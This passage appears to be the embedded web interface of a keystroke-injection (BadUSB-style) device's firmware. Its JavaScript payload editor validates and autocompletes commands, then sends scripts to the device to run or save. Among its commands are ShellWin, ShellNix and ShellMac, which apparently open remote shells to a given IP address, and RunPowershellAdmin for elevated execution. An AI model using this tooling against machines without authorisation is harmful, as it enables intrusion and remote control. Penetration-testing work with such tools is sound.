'Print',\n            'WinPrint',\n            'PrintLine',\n            'WinPrintLine',\n            'Delay',\n            'Press',\n            'PressRelease',\n            'Release',\n            // Key constants for Press/PressRelease\n            'KEY_LEFT_ALT',\n            'KEY_LEFT_GUI',\n            'KEY_LEFT_CTRL',\n            'KEY_LEFT_SHIFT',\n            'KEY_RIGHT_ALT',\n            'KEY_RIGHT_GUI',\n            'KEY_RIGHT_CTRL',\n            'KEY_RIGHT_SHIFT',\n            'KEY_ENTER',\n            'KEY_UP_ARROW',\n            'KEY_DOWN_ARROW',\n            'KEY_LEFT_ARROW',\n            'KEY_RIGHT_ARROW',\n            'KEY_BACKSPACE',\n            'KEY_TAB',\n            'KEY_PAUSE',\n            'KEY_INSERT',\n            'KEY_DELETE',\n            'KEY_PAGE_UP',\n            'KEY_PAGE_DOWN',\n            'KEY_ESC',\n            'KEY_SPACE',\n            'KEY_HOME',\n            'KEY_END',\n            'KEY_CAPS_LOCK',\n            'KEY_PRINT_SCREEN',\n            'KEY_SCROLL_LOCK',\n            'KEY_NUM_LOCK',\n            'KEY_MENU',\n            'LED_NUMLOCK',\n            'LED_CAPSLOCK',\n            'LED_SCROLLLOCK',\n            'LED_COMPOSE',\n            'LED_KANA',\n            'KEY_F1',\n            'KEY_F2',\n            'KEY_F3',\n            'KEY_F4',\n            'KEY_F5',\n            'KEY_F6',\n            'KEY_F7',\n            'KEY_F8',\n            'KEY_F9',\n            'KEY_F10',\n            'KEY_F11',\n            'KEY_F12'\n        ];\n        \n        // Generate suggestions on load\n        commandSuggestions = generateCommandSuggestions(commands);\n        \n        // Toggle section visibility\n        function toggleSection(element) {\n            const container = element.parentElement;\n            const content = container.querySelector('.command-table-container, .keys-table-container');\n            const arrow = element.querySelector('span:last-child');\n            \n            if (content.style.display === 'none') {\n                content.style.display = 'block';\n                arrow.textContent = '\ufffd\ufffd\ufffd';\n            } else {\n                content.style.display = 'none';\n                arrow.textContent = '\ufffd\ufffd\ufffd';\n            }\n        }\n\n        let toggleIntervals = {};\n\n        function validatePayload() {\n            const payloadInput = document.getElementById('livePayloadInput');\n            const validationStatus = document.getElementById('validationStatus');\n            const text = payloadInput.value.trim(); // Get trimmed content first\n\n            // Clear previous validation\n            validationStatus.className = '';\n            validationStatus.textContent = '';\n            validationStatus.title = '';\n\n            // Check for empty payload (primary check)\n            if (text === '') {\n                validationStatus.className = 'validation-empty validation-text';\n                validationStatus.textContent = 'Empty payload';\n                return; // Exit early if empty\n            }\n\n            // Only proceed with line validation if there's content\n            const lines = text.split('\\n');\n            let errors = [];\n\n            lines.forEach((line, index) => {\n                line = line.trim();\n                if (!line) return; // Skip empty lines\n\n                const parts = line.split(/\\s+/);\n                const command = parts[0];\n                const args = parts.slice(1).join(' ');\n\n                const validationResult = isValidCommand(command, args, index + 1);\n                if (!validationResult.valid) {\n                    errors.push(`Line ${index + 1}: ${validationResult.message}`);\n                }\n            });\n\n            // Display validation results\n            if (errors.length > 0) {\n                validationStatus.className = 'validation-error validation-text';\n                validationStatus.textContent = errors.join('\\n');\n                validationStatus.title = errors.join('\\n');\n            } else {\n                validationStatus.className = 'validation-ok validation-text';\n                validationStatus.textContent = 'All commands are valid';\n            }\n        }\n\n        function isValidCommand(command, args, lineNumber) {\n            // Enhanced command validation with specific rules\n            const commandRules = {\n                '# Layout:': {\n                    validate: args => {\n                        // Valid layouts from firmware.ino\n                        const validLayouts = [\n                            'EN_US', 'ES_ES', 'FR_FR', 'IT_IT', 'DA_DK', \n                            'DE_DE', 'HR_HR', 'HU_HU', 'PT_PT', 'PT_BR', \n                            'BE_BE', 'BR_BR', 'CA_CA', 'CA_FR', 'SK_SK', \n                            'CZ_CZ', 'SV_SE', 'SI_SI'\n                        ];\n                        return validLayouts.includes(args.trim());\n                    },\n                    message: 'requires valid keyboard layout code (e.g., EN_US, SI_SI)'\n                },\n                'ServerConnect': {\n                    validate: args => args.length > 0,\n                    message: 'requires IP address/hostname'\n                },\n                'DetectOS': {\n                    validate: args => args.length === 0,\n                    message: 'takes no arguments'\n                },\n                'RunWin': {\n                    validate: args => args.length > 0,\n                    message: 'requires command to run'\n                },\n                'RunPowershellAdmin': {\n                    validate: args => true, // Can have optional arguments\n                    message: 'optional: command to run'\n                },\n                'RunCmdAdmin': {\n                    validate: args => true, // Can have optional arguments\n                    message: 'optional: command to run'\n                },\n                'ShellWin': {\n                    validate: args => args.length > 0,\n                    message: 'requires IP address'\n                },\n                'RunNix': {\n                    validate: args => args.length > 0,\n                    message: 'requires command to run'\n                },\n                'RunLauncher': {\n                    validate: args => args.length > 0,\n                    message: 'requires application name'\n                },\n                'CtrlAltT': {\n                    validate: args => args.length === 0,\n                    message: 'takes no arguments'\n                },\n                'ShellNix': {\n                    validate: args => args.length > 0,\n                    message: 'requires IP address'\n                },\n                'ShellMac': {\n                    validate: args => args.length > 0,\n                    message: 'requires IP address'\n                },\n                'ShellMacCleanup': {\n                    validate: args => args.length === 0,\n                    message: 'takes no arguments'\n                },\n                'RunMac': {\n                    validate: args => args.length > 0,\n                    message: 'requires command or application name'\n                },\n                'GuiR': {\n                    validate: args => args.length === 0,\n                    message: 'takes no arguments'\n                },\n                'Gui': {\n                    validate: args => args.length === 0,\n                    message: 'takes no arguments'\n                },\n                'AltF2': {\n                    validate: args => args.length === 0,\n                    message: 'takes no arguments'\n                },\n                'GuiSpace': {\n                    validate: args => args.length === 0,\n                    message: 'takes no arguments'\n                },\n                'Print': {\n                    validate: args => args.length > 0,\n                    message: 'requires text to print'\n                },\n                'WinPrint': {\n                    validate: args => args.length > 0,\n                    message: 'requires text to print'\n                },\n                'PrintLine': {\n                    validate: args => args.length > 0,\n                    message: 'requires text to print'\n                },\n                'WinPrintLine': {\n                    validate: args => args.length > 0,\n                    message: 'requires text to print'\n                },\n                'Delay': {\n                    validate: args => {\n                        const num = parseInt(args);\n                        return args.trim() !== '' && !isNaN(num) && num > 0;\n                    },\n                    message: 'requires positive number (milliseconds)'\n                },\n                'Press': {\n                    validate: isValidKey,\n                    message: 'requires valid key name'\n                },\n                'PressRelease': {\n                    validate: isValidKey,\n                    message: 'requires valid key name'\n                },\n                'Release': {\n                    validate: args => args.length === 0,\n                    message: 'takes no arguments'\n                },\n                // Key constants don't need validation as they're used as arguments to Press/PressRelease\n                'KEY_LEFT_ALT': { validate: args => false, message: 'not a command but a key parameter' },\n                'KEY_LEFT_GUI': { validate: args => false, message: 'not a command but a key parameter' },\n                'KEY_LEFT_CTRL': { validate: args => false, message: 'not a command but a key parameter' },\n                'KEY_LEFT_SHIFT': { validate: args => false, message: 'not a command but a key parameter' },\n                'KEY_RIGHT_ALT': { validate: args => false, message: 'not a command but a key parameter' },\n                'KEY_RIGHT_GUI': { validate: args => false, message: 'not a command but a key parameter' },\n                'KEY_RIGHT_CTRL': { validate: args => false, message: 'not a command but a key parameter' },\n                'KEY_RIGHT_SHIFT': { validate: args => false, message: 'not a command but a key parameter' },\n                'KEY_ENTER': { validate: args => false, message: 'not a command but a key parameter' },\n                'KEY_UP_ARROW': { validate: args => false, message: 'not a command but a key parameter' },\n                'KEY_DOWN_ARROW': { validate: args => false, message: 'not a command but a key parameter' },\n                'KEY_LEFT_ARROW': { validate: args => false, message: 'not a command but a key parameter' },\n                'KEY_RIGHT_ARROW': { validate: args => false, message: 'not a command but a key parameter' },\n                'KEY_BACKSPACE': { validate: args => false, message: 'not a command but a key parameter' },\n                'KEY_TAB': { validate: args => false, message: 'not a command but a key parameter' },\n                'KEY_PAUSE': { validate: args => false, message: 'not a command but a key parameter' },\n                'KEY_INSERT': { validate: args => false, message: 'not a command but a key parameter' },\n                'KEY_DELETE': { validate: args => false, message: 'not a command but a key parameter' },\n                'KEY_PAGE_UP': { validate: args => false, message: 'not a command but a key parameter' },\n                'KEY_PAGE_DOWN': { validate: args => false, message: 'not a command but a key parameter' },\n                'KEY_ESC': { validate: args => false, message: 'not a command but a key parameter' },\n                'KEY_SPACE': { validate: args => false, message: 'not a command but a key parameter' },\n                'KEY_HOME': { validate: args => false, message: 'not a command but a key parameter' },\n                'KEY_END': { validate: args => false, message: 'not a command but a key parameter' },\n                'KEY_CAPS_LOCK': { validate: args => false, message: 'not a command but a key parameter' },\n                'KEY_PRINT_SCREEN': { validate: args => false, message: 'not a command but a key parameter' },\n                'KEY_SCROLL_LOCK': { validate: args => false, message: 'not a command but a key parameter' },\n                'KEY_NUM_LOCK': { validate: args => false, message: 'not a command but a key parameter' },\n                'KEY_MENU': { validate: args => false, message: 'not a command but a key parameter' },\n                'LED_NUMLOCK': { validate: args => false, message: 'not a command but a key parameter' },\n                'LED_CAPSLOCK': { validate: args => false, message: 'not a command but a key parameter' },\n                'LED_SCROLLLOCK': { validate: args => false, message: 'not a command but a key parameter' },\n                'LED_COMPOSE': { validate: args => false, message: 'not a command but a key parameter' },\n                'LED_KANA': { validate: args => false, message: 'not a command but a key parameter' },\n                'KEY_F1': { validate: args => false, message: 'not a command but a key parameter' },\n                'KEY_F2': { validate: args => false, message: 'not a command but a key parameter' },\n                'KEY_F3': { validate: args => false, message: 'not a command but a key parameter' },\n                'KEY_F4': { validate: args => false, message: 'not a command but a key parameter' },\n                'KEY_F5': { validate: args => false, message: 'not a command but a key parameter' },\n                'KEY_F6': { validate: args => false, message: 'not a command but a key parameter' },\n                'KEY_F7': { validate: args => false, message: 'not a command but a key parameter' },\n                'KEY_F8': { validate: args => false, message: 'not a command but a key parameter' },\n                'KEY_F9': { validate: args => false, message: 'not a command but a key parameter' },\n                'KEY_F10': { validate: args => false, message: 'not a command but a key parameter' },\n                'KEY_F11': { validate: args => false, message: 'not a command but a key parameter' },\n                'KEY_F12': { validate: args => false, message: 'not a command but a key parameter' }\n            };\n\n            // Handle empty lines or commands\n            if (!command || command === '') {\n                return { valid: true }; // Empty lines are valid (allows for comments or spacing)\n            }\n\n            // Check if the command exists in our rules\n            if (!commandRules[command]) {\n                return { valid: false, message: `Unknown command \"${command}\"` };\n            }\n\n            const validation = commandRules[command];\n            if (!validation.validate(args)) {\n                return { valid: false, message: `${command} ${validation.message}` };\n            }\n\n            return { valid: true };\n        }\n\n        function isValidKey(key) {\n            // Trim whitespace and convert to uppercase for consistent comparison\n            key = key.trim().toUpperCase();\n\n            // Check if it's a single printable character (not control characters)\n            if (key.length === 1 && key.charCodeAt(0) >= 32 && key.charCodeAt(0) <= 126) {\n                return true;\n            }\n\n            // Check against our master commands list (already contains all KEY_* constants)\n            return commands.some(cmd => \n                cmd.toUpperCase() === key && \n                (cmd.startsWith('KEY_') || cmd.startsWith('LED_'))\n            );\n        }\n\n        function generateCommandSuggestions(commands) {\n            const suggestions = {};\n            commands.forEach(cmd => {\n                for (let i = 2; i <= cmd.length; i++) {\n                    const prefix = cmd.substring(0, i);\n                    const remaining = cmd.substring(i);\n                    if (!suggestions[prefix] || remaining.length < suggestions[prefix].length) {\n                        suggestions[prefix] = remaining;\n                    }\n                }\n            });\n            return suggestions;\n        }\n\n        function updateLineNumbers() {\n            const textarea = document.getElementById('livePayloadInput');\n            const lineNumbers = document.getElementById('lineNumbers');\n            const lines = textarea.value.split('\\n');\n\n            // Get computed styles for accurate measurements\n            const textareaStyle = getComputedStyle(textarea);\n            const lineHeight = parseFloat(textareaStyle.lineHeight);\n            const paddingTop = parseFloat(textareaStyle.paddingTop);\n            const paddingBottom = parseFloat(textareaStyle.paddingBottom);\n\n            // Calculate total height needed\n            const totalHeight = lines.length * lineHeight + paddingTop + paddingBottom;\n\n            // Generate line numbers HTML\n            lineNumbers.innerHTML = Array(lines.length).fill().map((_, i) => \n                `<div style=\"height: ${lineHeight}px; line-height: ${lineHeight}px\">${i + 1}</div>`\n            ).join('');\n\n            // Sync scroll positions\n            lineNumbers.scrollTop = textarea.scrollTop;\n        }\n\n        function validateCurrentLine(e) {\n            const textarea = document.getElementById('livePayloadInput');\n            const validationStatus = document.getElementById('validationStatus');\n            const content = textarea.value.trim();\n        \n            // Always handle auto-suggestion on any input\n            handleAutoSuggestion();\n        \n            // First check if the entire payload is empty\n            if (content === '') {\n                validationStatus.className = 'validation-empty validation-text';\n                validationStatus.textContent = 'Empty payload';\n                validationStatus.title = 'Empty payload';\n                return;\n            }\n        \n            const lines = textarea.value.split('\\n');\n            const currentLineNumber = textarea.value.substr(0, textarea.selectionStart).split('\\n').length;\n            const currentLine = lines[currentLineNumber - 1].trim();\n        \n            // Only validate on certain input events\n            const shouldValidate = e.inputType === 'insertLineBreak' || \n                                e.inputType === 'insertText' || \n                                e.inputType === 'deleteContentBackward';\n        \n            if (!shouldValidate) return;\n        \n            // First validate the current line\n            if (currentLine) {\n                const validationResult = isValidCommandLine(currentLine);\n                if (!validationResult.valid) {\n                    const errorMsg = `Error in line ${currentLineNumber}: ${validationResult.message}`;\n                    validationStatus.className = 'validation-error validation-text';\n                    validationStatus.textContent = errorMsg;\n                    validationStatus.title = errorMsg;\n                    return;\n                }\n            }\n        \n            // If the current line is valid, check for errors in any line of the payload\n            for (let i = 0; i < lines.length; i++) {\n                const line = lines[i].trim();\n                if (!line) continue; // Skip empty lines\n        \n                const validationResult = isValidCommandLine(line);\n                if (!validationResult.valid) {\n                    const errorMsg = `Error in line ${i + 1}: ${validationResult.message}`;\n                    validationStatus.className = 'validation-error validation-text';\n                    validationStatus.textContent = errorMsg;\n                    validationStatus.title = errorMsg;\n                    return;\n                }\n            }\n        \n            // If we get here, the entire payload is valid\n            validationStatus.className = 'validation-ok validation-text';\n            validationStatus.textContent = 'Valid';\n            validationStatus.title = '';\n        }\n\n        function isValidCommandLine(line) {\n            // Special handling for \"# Layout:\" command\n            if (line.startsWith('# Layout:')) {\n                const args = line.substring('# Layout:'.length).trim();\n                return isValidCommand('# Layout:', args, 0);\n            }\n            \n            // Normal command handling\n            const parts = line.split(/\\s+/);\n            const command = parts[0];\n            const args = parts.slice(1).join(' ');\n\n            // Get the line number (for error reporting)\n            const textarea = document.getElementById('livePayloadInput');\n            const lines = textarea.value.split('\\n');\n            const currentLineNumber = textarea.value.substr(0, textarea.selectionStart).split('\\n').length;\n            \n            // Pass command, args, and line number to the validator\n            return isValidCommand(command, args, currentLineNumber);\n        }\n\n        function handleAutoSuggestion() {\n            const textarea = document.getElementById('livePayloadInput');\n            const cursorPos = textarea.selectionStart;\n            const textBeforeCursor = textarea.value.substring(0, cursorPos);\n            const currentLine = textBeforeCursor.split('\\n').pop().trim();\n\n            // Clear any previous suggestion\n            currentSuggestion = null;\n            \n            // Find matching suggestion without showing visual hint\n            for (const [prefix, suggestion] of Object.entries(commandSuggestions)) {\n                if (currentLine === prefix) {\n                    currentSuggestion = suggestion;\n                    return;\n                }\n            }\n        }\n        \n        function handleTabCompletion(e) {\n            if (e.key === 'Tab') {\n                // Always prevent default tab behavior in the textarea\n                e.preventDefault();\n                \n                // Only apply autocompletion if we have a suggestion\n                if (currentSuggestion) {\n                    const textarea = document.getElementById('livePayloadInput');\n                    const cursorPos = textarea.selectionStart;\n                    const textBeforeCursor = textarea.value.substring(0, cursorPos);\n                    const textAfterCursor = textarea.value.substring(cursorPos);\n            \n                    // Insert the suggestion\n                    textarea.value = textBeforeCursor + currentSuggestion + textAfterCursor;\n            \n                    // Move cursor to end of completed command\n                    const newCursorPos = cursorPos + currentSuggestion.length;\n                    textarea.setSelectionRange(newCursorPos, newCursorPos);\n            \n                    // Clean up\n                    currentSuggestion = null;\n            \n                    // Trigger input event\n                    const event = new Event('input');\n                    textarea.dispatchEvent(event);\n                }\n                // If no suggestion exists, the cursor simply stays where it is\n            }\n        }\n\n\n        function checkPayloadStatus(endpoint, toggleId) {\n            fetch(endpoint)\n            .then(response => response.json())\n            .then(data => {\n                if (data.status === \"executed\") {\n                  document.getElementById(toggleId).checked = false;\n                  clearInterval(toggleIntervals[toggleId]);\n                }\n            })\n            .catch(error => console.error(\"Error checking payload status:\", error));\n        }\n\n        function runPayload() {\n            const validationStatus = document.getElementById('validationStatus');\n            const payloadContent = document.getElementById('livePayloadInput').value;\n\n            // Check for empty payload\n            if (payloadContent.trim() === '') {\n                showMessage('error', 'Payload content cannot be empty!');\n                return;\n            }\n\n            // Check if there are validation errors\n            if (validationStatus.classList.contains('validation-error')) {\n                showMessage('error', 'Please fix validation errors before running the payload');\n                return;\n            }\n\n            fetch('/runlivepayload', {\n                method: 'POST',\n                body: new URLSearchParams({ livepayload: payloadContent }),\n            })\n            .then(response => {\n                if (response.ok) return response.text();\n                else throw new Error('Error running payload');\n            })\n            .then(data => {\n                showMessage('success', 'Payload running...');\n                toggleIntervals['togglePayload'] = setInterval(() => {\n                    checkPayloadStatus('/payloadstatuspayload', 'togglePayload');\n                }, 1000);\n            })\n            .catch(error => {\n                showMessage('error', 'Error executing payload.');\n                console.error('Error:', error);\n                toggle.checked = false;\n            });\n        }\n\n        function showSavePayloadForm() {\n            const validationStatus = document.getElementById('validationStatus');\n            const payloadContent = document.getElementById('livePayloadInput').value;\n\n            // Check for empty payload\n            if (payloadContent.trim() === '') {\n                showMessage('error', 'Payload content cannot be empty!');\n                return;\n            }\n\n            // Check if there are validation errors\n            if (validationStatus.classList.contains('validation-error')) {\n                showMessage('error', 'Please fix validation errors before saving the payload');\n                return;\n            }\n\n            document.getElementById('metadataForm').style.display = 'block';\n            document.getElementById('metadataForm').scrollIntoView({ behavior: 'smooth' });\n        }\n\n        function cancelSavePayload() {\n            document.getElementById('metadataForm').style.display = 'none';\n        }\n\n        function confirmSavePayload() {\n            const validationStatus = document.getElementById('validationStatus');\n\n            // Check if there are validation errors\n            if (validationStatus.classList.contains('validation-error')) {\n                showMessage('error', 'Please fix validation errors before saving the payload');\n                return;\n            }\n\n            const payloadContent = document.getElementById('livePayloadInput').value;\n            const payloadName = document.getElementById('payloadName').value;\n            const payloadDesc = document.getElementById('payloadDescription').value;\n            const payloadOS = document.getElementById('payloadOS').value;\n\n            // Additional check for empty payload\n            if (!payloadContent) {\n                showMessage('error', 'Payload content cannot be empty!');\n                return;\n            }\n\n            const formData = new FormData();\n            formData.append('livepayload', payloadContent);\n            formData.append('payloadName', payloadName || 'Unnamed Payload');\n            formData.append('payloadDescription', payloadDesc || 'No description provided');\n            formData.append('payloadOS', payloadOS || 'unknown');\n\n            fetch('/runlivesave', {\n                method: 'POST',\n                body: formData\n            })\n            .then(response => {\n                if (response.ok) return response.text();\n                else throw new Error('Error saving payload');\n            })\n            .then(data => {\n                showMessage('success', 'Payload saved successfully!');\n                document.getElementById('metadataForm').style.display = 'none';\n                document.getElementById('payloadName').value = '';\n                document.getElementById('payloadDescription').value = '';\n                document.getElementById('payloadOS').value = '';\n            })\n            .catch(error => {\n                showMessage('error', 'Error saving payload.');\n                console.error('Error:', error);\n            });\n        }\n\n        function showMessage(type, text) {\n            const container = document.getElementById('global-toast');\n            const toast = document.createElement('div');\n            toast.className = `toast-message ${type}`;\n\n            const messageSpan = document.createElement('span');\n            messageSpan.textContent = text;\n\n            const closeButton = document.createElement('span');\n            closeButton.className = 'toast-close';\n            closeButton.innerHTML = '&times;';\n            closeButton.onclick = () => {\n                toast.style.animation = 'toastFadeOut 0.3s ease-out';\n                setTimeout(() => toast.remove(), 300);\n            };\n\n            toast.appendChild(messageSpan);\n            toast.appendChild(closeButton);\n            container.appendChild(toast);\n\n            // Auto-remove after 5 seconds\n            const timer = setTimeout(() => {\n                toast.style.animation = 'toastFadeOut 0.3s ease-out';\n                setTimeout(() => toast.remove(), 300);\n            }, 5000);\n\n            // Update close handler to also clear the timer\n            closeButton.onclick = () => {\n                clearTimeout(timer);\n                toast.style.animation = 'toastFadeOut 0.3s ease-out';\n                setTimeout(() => toast.remove(), 300);\n            };\n        }\n\n        // Initialize when page loads\n        document.addEventListener('DOMContentLoaded', function() {\n            updateLineNumbers();\n\n            setTimeout(() => {\n                updateLineNumbers();\n            }, 100);\n\n            validatePayload();\n\n            // Setup text area event handlers\n            const payloadInput = document.getElementById('livePayloadInput');\n\n            // Input event for content changes, validation, and line numbers\n            payloadInput.addEventListener('input', function(e) {\n                updateLineNumbers();\n                validatePayload();\n                validateCurrentLine(e);\n                handleAutoSuggestion();\n            });\n\n            // Key events for tab completion\n            payloadInput.addEventListener('keydown', handleTabCompletion);\n\n            // Scroll event for line number sync - improved\n            payloadInput.addEventListener('scroll', function() {\n                const lineNumbers = document.getElementById('lineNumbers');\n                lineNumbers.scrollTop = this.scrollTop;\n            });\n            // Clear current suggestion on blur\n            payloadInput.addEventListener('blur', function() {\n                currentSuggestion = null;\n            });\n\n            // Command cell click handlers\n            document.querySelectorAll('.command-cell').forEach(cell => {\n                cell.addEventListener('click', function() {\n                    const textarea = document.getElementById('livePayloadInput');\n                    const command = this.textContent;\n\n                    if (textarea.value === '') {\n                        textarea.value = command;\n                    } else {\n                        if (textarea.value.slice(-1) !== '\\n') { \n                            textarea.value += '\\n';\n                        }\n                        textarea.value += command;\n                    }\n\n                    textarea.focus();\n                    textarea.scrollTop = textarea.scrollHeight;\n\n                    this.style.backgroundColor = 'rgba(0, 242, 255, 0.3)';\n                    setTimeout(() => {\n                        this.style.backgroundColor = '';\n                    }, 300);\n                });\n\n                cell.style.cursor = 'pointer';\n            });\n        });\n\n        if (window.location.search.includes('edit=true')) {\n            const editPayloadContent = localStorage.getItem('editPayloadContent');\n            const editPayloadPath = localStorage.getItem('editPayloadPath')\n            if (editPayloadContent && editPayloadPath) {\n                document.getElementById('livePayloadInput').value = editPayloadContent;\n                updateLineNumbers();\n                validatePayload()\n                // Modify the save button to update existing payload\n                document.querySelector('button[onclick=\"showSavePayloadForm()\"]').textContent = 'Save Changes';\n                document.querySelector('button[onclick=\"showSavePayloadForm()\"]').onclick = function() {\n                    updateExistingPayload(editPayloadPath);\n                }\n                // Clean up localStorage\n                localStorage.removeItem('editPayloadContent');\n                localStorage.removeItem('editPayloadPath');\n            }\n        }\n        \n        function updateExistingPayload(filePath) {\n            const validationStatus = document.getElementById('validationStatus');\n            const payloadContent = document.getElementById('livePayloadInput').value;\n\n            // Check for empty payload\n            if (payloadContent.trim() === '') {\n                showMessage('error', 'Payload content cannot be empty!');\n                return;\n            }\n\n            // Check if there are validation errors\n            if (validationStatus.classList.contains('validation-error')) {\n                showMessage('error', 'Please fix validation errors before saving changes');\n                return;\n            }\n\n            fetch('/updatepayload', {\n                method: 'POST',\n                headers: { 'Content-Type': 'application/json' },\n                body: JSON.stringify({ \n                    path: filePath, \n                    content: payloadContent \n                })\n            })\n            .then(handleUpdateResponse)\n            .catch(handleUpdateError);\n        }\n\n        function handleUpdateResponse(response) {\n            if (!response.ok) {\n                return response.text().then(text => { throw new Error(text) });\n            }\n            return response.json().then(data => {\n                if (data.success) {\n                    showMessage('success', 'Payload updated successfully!');\n                } else {\n                    showMessage('error', data.message || 'Update failed');\n                }\n            });\n        }\n\n        function handleUpdateError(error) {\n            console.error('Update error:', error);\n            showMessage('error', `Update failed: ${error.message}`);\n        }\n    </script>\n</body>\n</html>\n)=====\";"
}